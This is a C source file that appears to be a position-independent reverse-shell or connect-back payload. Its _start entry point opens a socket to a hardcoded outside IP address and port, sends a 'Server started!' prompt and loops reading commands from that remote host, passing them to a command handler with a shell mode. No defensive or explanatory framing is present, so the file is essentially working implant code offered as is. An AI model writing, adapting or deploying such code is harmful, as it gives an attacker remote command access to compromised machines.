#include "include.h"

#define REMOTE_PORT 4082
#define REMOTE_HOST IPV4_ADDR(5,161,50,249)

void _start(void)
{
  struct sockaddr_in sa;
  int i, r;
  char buf[BUFSIZ];
  struct pollfd evts[1];
  data_t data;

  data.command_len = 0;
  data.shell_mode = 0;
  data.long_symbols = 0x0A2165002E203E0A; // one and two-char strings:  reverse('\n', '> ', '.\0', 'e!\n')

#ifdef LIBC
  data.libc_addr = get_libc(data.temp, BUFSIZ);
#endif

  // create a socket
  data.s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = REMOTE_HOST;
  sa.sin_port = htons(REMOTE_PORT);

  r = connect(data.s, (struct sockaddr *)&sa, sizeof(sa));

  if (r >= 0)
  {
#ifndef _COMPACT
    PRINT_TEXT(data.s, "Server started!\n> ");
#else
    PRINT_CHARS(data.s, data.symbols.prompt);
#endif

    evts[0].fd = data.s;
    evts[0].events = POLLIN;

    // now loop until user exits or some other error
    for (;;)
    {
      r = poll(evts, 1, 1000);

      if (r < 0)
        break;

      // read from socket and write to stdin
      r = read(data.s, buf, BUFSIZ);
      if (!r)
        break;

      // write(in[1], buf, len);
      if (!data.shell_mode)
      {
        for (i = 0; i < r; i++)
        {
          if (buf[i] == '\n')
          {
            data.command[data.command_len] = 0;
            process_command(&data);
            continue;
          }
          data.command[data.command_len++] = buf[i];
        }

        if (data.command_len == 0)
        {
          PRINT_CHARS(data.s, data.symbols.prompt);
        }
      }
    }
  }
  //else
   // PRINT_TEXT(STDERR_FILENO, "connect() failed!\n");

  // shutdown socket
  shutdown(data.s, SHUT_RDWR);
  close(data.s);

  _exit(0);
}
